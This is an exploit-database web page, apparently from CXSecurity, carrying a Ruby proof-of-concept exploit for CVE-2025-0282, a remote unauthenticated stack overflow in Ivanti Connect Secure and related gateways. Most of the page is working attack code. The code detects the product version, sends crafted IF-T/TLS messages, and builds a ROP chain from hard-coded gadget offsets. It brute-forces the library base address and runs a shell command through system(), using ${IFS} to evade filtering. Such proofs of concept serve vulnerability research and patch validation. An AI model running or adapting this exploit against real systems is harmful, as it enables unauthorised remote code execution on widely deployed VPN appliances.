---
title: Ivanti Buffer Overflow Proof of Concept
url: https://cxsecurity.com/issue/WLB-2025010022
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-01-23
fetch_date: 2025-10-06T20:09:21.211418
---

# Ivanti Buffer Overflow Proof of Concept

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Ivanti Buffer Overflow Proof of Concept** **2025.01.22**  Credit:  **[Stephen Fewer](https://cxsecurity.com/author/Stephen%2BFewer%2B/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-0282](https://cxsecurity.com/cveshow/CVE-2025-0282/ "Click to see CVE-2025-0282")**  CWE: **N/A** | |

# PoC for CVE-2025-0282, a remote unauthenticated stack based buffer overflow affecting
# Ivanti Connect Secure, Ivanti Policy Secure, and Ivanti Neurons for ZTA gateways.
#
# Based upon the exploitation strategy published by watchTowr (https://labs.watchtowr.com/exploitation-walkthrough-and-techniques-ivanti-connect-secure-rce-cve-2025-0282).
#
# Usage: ruby CVE-2025-0282.rb -t 192.168.86.111 -p 443
#
# Stephen Fewer (Rapid7) - January 16, 2025.
require 'base64'
require 'socket'
require 'openssl'
require 'httparty'
require 'optparse'
HTTParty::Basement.default\_options.update(verify: false)
def log(txt)
$stdout.puts txt
end
def rand\_string(len)
(0...len).map {'a'.ord + rand(26)}.pack('C\*')
end
def send\_http\_data(s, data, verbose=false)
s.write(data)
result = ''
content\_length = 0
while line = s.gets
p line if verbose
m = line.match(/Content-length: (\d+)\r\n/)
if m
content\_length = m[1].to\_i
end
result << line
if line == "\r\n" && content\_length
break if content\_length <= 0
content = s.read(content\_length)
p content if verbose
result << content
break
end
end
return result
end
# https://github.com/BishopFox/CVE-2025-0282-check/blob/main/scan-cve-2025-0282.py#L6
def get\_productversion(ip,port)
res = HTTParty.get("https://#{ip}:#{port}/dana-na/auth/url\_admin/welcome.cgi?type=inter")
return nil unless res&.code == 200
m = res.body.match(/name="productversion"\s+value="(\d+.\d+.\d+.\d+)"/i)
return nil unless m&.length == 2
m[1]
end
def hax(ip, port)
log "[+] Targeting #{ip}:#{port}"
productversion = get\_productversion(ip, port)
if productversion.nil?
log "[-] Could not get product version for #{ip}:#{port}"
return
end
log "[+] Detected version #{productversion}"
# Note: All gadgets are from /home/lib/libdsplibs.so
targets= {
# 22.7r2.4 b3597 (libdsplibs.so sha1: f31a3cc442df5178b37ea539ff418fec9bf3404f)
'22.7.2.3597' => {
padding\_to\_vftable: 2288,
vftable\_gadget\_offset: 0x00934365 + 2,
padding\_to\_next\_frame: 2934,
offset\_to\_got\_plt: 0x00157c000,
gadget\_inc\_ebx\_ret: 0x01338373,
gadget\_mov\_eax\_esp\_retn\_c: 0x00ca2e84,
gadget\_add\_eax\_8\_ret: 0x007a040c,
gadget\_mov\_esp\_eax\_call\_system: 0x004f0df3,
}
}
target = targets[productversion]
throw "No target for #{productversion}" unless target
log "[#{Time.now}] Starting..."
attempt = 0
0.upto(2048) do
s = TCPSocket.open(ip, port)
if port == 443
ctx = OpenSSL::SSL::SSLContext.new
ctx.set\_params(verify\_mode: OpenSSL::SSL::VERIFY\_NONE)
s = OpenSSL::SSL::SSLSocket.new(s, ctx).tap do |socket|
socket.sync\_close = true
socket.connect
end
end
body = "GET / HTTP/1.1\r\n"
body << "Host: #{ip}:#{port}\r\n"
body << "User-Agent: AnyConnect-compatible OpenConnect VPN Agent v9.12-188-gaebfabb3-dirty\r\n"
body << "Content-Type: EAP\r\n"
body << "Upgrade: IF-T/TLS 1.0\r\n"
body << "Content-Length: 0\r\n"
body << "\r\n"
res1 = send\_http\_data(s, body)
unless res1.include? '101 Switching Protocols'
throw "bad response1"
end
data = [0, 1, 2, 2].pack('C\*') # min version 1, max version 2, preferred version 2.
body = [
0x00005597, # VENDOR\_TCG
0x00000001, # IFT\_VERSION\_REQUEST
data.length + 16,
0 # seq id
].pack('NNNN') + data
s.write(body)
attempt += 1
libdsplibs\_base = 0xf6492000
buffer = ('C' \* target[:padding\_to\_vftable])
buffer += [libdsplibs\_base + target[:vftable\_gadget\_offset]].pack('V') # ptr to address + 0x48, to ptr, to gadget
buffer += ('A' \* target[:padding\_to\_next\_frame])
buffer += [libdsplibs\_base + target[:offset\_to\_got\_plt] - 1].pack('V') # ebx == got.plt - 1
buffer += [0xCAFEBEEF].pack('V') # esi
buffer += [0xCAFEBEEF].pack('V') # edi
buffer += [0xCAFEBEEF].pack('V') # ebp
buffer += [libdsplibs\_base + target[:gadget\_inc\_ebx\_ret]].pack('V') # inc ebx; ret;
buffer += [libdsplibs\_base + target[:gadget\_mov\_eax\_esp\_retn\_c]].pack('V') # mov eax, esp; ret 0xc;
buffer += [libdsplibs\_base + target[:gadget\_add\_eax\_8\_ret]].pack('V') # add eax, 8; ret;
buffer += [0xCAFEBEEF].pack('V')
buffer += [0xCAFEBEEF].pack('V')
buffer += [0xCAFEBEEF].pack('V')
buffer += [libdsplibs\_base + target[:gadget\_add\_eax\_8\_ret]].pack('V') # add eax, 8; ret;
buffer += [libdsplibs\_base + target[:gadget\_add\_eax\_8\_ret]].pack('V') # add eax, 8; ret;
buffer += [libdsplibs\_base + target[:gadget\_add\_eax\_8\_ret]].pack('V') # add eax, 8; ret;
buffer += [libdsplibs\_base + target[:gadget\_add\_eax\_8\_ret]].pack('V') # add eax, 8; ret;
buffer += [libdsplibs\_base + target[:gadget\_mov\_esp\_eax\_call\_system]].pack('V') # mov [esp], eax; call system;
buffer += [0xCAFEBEEF].pack('V')
buffer += "touch /var/tmp/haxor\_#{attempt}; #".gsub(' ', '${IFS}')
["\x00"].each do |bad\_char|
throw "buffer cannot have bad char #{bad\_char.chr}" if buffer.include? bad\_char
end
data = "clientHostName=abcdefgh clientIp=127.0.0.1 clientCapabilities=#{buffer}\n\x00"
body = [
0x00000a4c, # VENDOR\_JUNIPER
0x00000088, # ?
data.length + 16,
1 # seq id
].pack('NNNN') + data
log "[#{Time.now}] Triggering ##{attempt}..."
s.write(body)
rescue Errno::ECONNREFUSED, Errno::ECONNRESET, Errno::ECONNABORTED
sleep(1)
next
end
end
target\_ip = nil
target\_port = 443
OptionParser.new do |opts|
opts.banner = "Usage: CVE-2025-0282.rb [options]"
opts.on("-t", "--taget=TARGET", "target IP") do |v|
target\_ip = v
end
opts.on("-p", "--port=PORT", "target port") do |v|
target\_port = v.to\_i
end
end.parse!
throw "set target IP via -t argument" unless target\_ip
hax(target\_ip, target\_port)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025010022)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
...